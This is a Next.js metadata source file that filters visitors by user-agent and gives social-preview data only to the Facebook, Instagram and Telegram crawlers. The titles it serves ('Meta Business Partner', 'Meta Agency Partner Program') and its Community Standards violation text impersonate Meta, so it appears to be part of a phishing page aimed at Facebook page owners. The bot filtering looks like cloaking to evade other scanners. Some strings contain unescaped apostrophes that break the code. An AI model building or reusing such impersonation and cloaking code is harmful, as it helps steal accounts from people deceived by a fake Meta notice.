import { headers } from 'next/headers';
import DeviceDetector from 'device-detector-js';

export async function generateMetadata() {
    const headersList = headers();
    const userAgent = headersList.get('user-agent')?.toLowerCase() || '';
    const protocol = headersList.get('x-forwarded-proto') || 'https';
    const host = headersList.get('host') || 'localhost:3000';
    const metadataBase = new URL(`${protocol}://${host}`);

    const deviceDetector = new DeviceDetector();
    const device = deviceDetector.parse(userAgent);

    const isFacebookBot = userAgent.includes('facebookexternalhit') || userAgent.includes('facebot');
    const isInstagramBot = userAgent.includes('instagram');
    const isTelegramBot = userAgent.includes('telegrambot');

    const isAllowedBot = isFacebookBot || isInstagramBot || isTelegramBot;

    if (device.bot && !isAllowedBot) {
        return null;
    }

    return {
        metadataBase,
        title: 'Meta Business Partner',
        description: 'Read this Business Help Center article to learn more about the types of content that violate Facebook's Community Standards.',
        icons: {
            icon: '/favicon-32x32.png',
            apple: '/favicon-32x32.png',
            shortcut: '/favicon-32x32.png',
        },
        openGraph: {
            title: 'Meta Agency Partner Program',
            description: 'Read this Business Help Center article to learn more about the types of content that violate Facebook's Community Standards.',
            images: [
                {
                    url: `https://i.postimg.cc/sgnQYgTC/social-preview.png`,
                    width: 1200,
                    height: 630,
                    alt: 'Fanpage Privacy Policy'
                }
            ]
        },
        twitter: {
            card: 'summary_large_image',
            title: 'Meta Agency Partner Program',
            description: 'Read this Business Help Center article to learn more about the types of content that violate Facebook's Community Standards.',
            images: [`https://i.postimg.cc/sgnQYgTC/social-preview.png`]
        }
    };
}